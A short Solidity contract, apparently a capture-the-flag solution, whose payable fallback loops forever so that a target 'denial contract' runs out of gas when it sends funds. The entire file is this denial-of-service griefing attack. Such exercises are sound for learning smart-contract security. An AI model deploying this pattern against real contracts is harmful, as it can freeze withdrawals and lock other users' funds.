// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Acceptance {
    // This will make the denial contract run out of gas.
    fallback() payable external {
        while(true) {

        }
    }
}
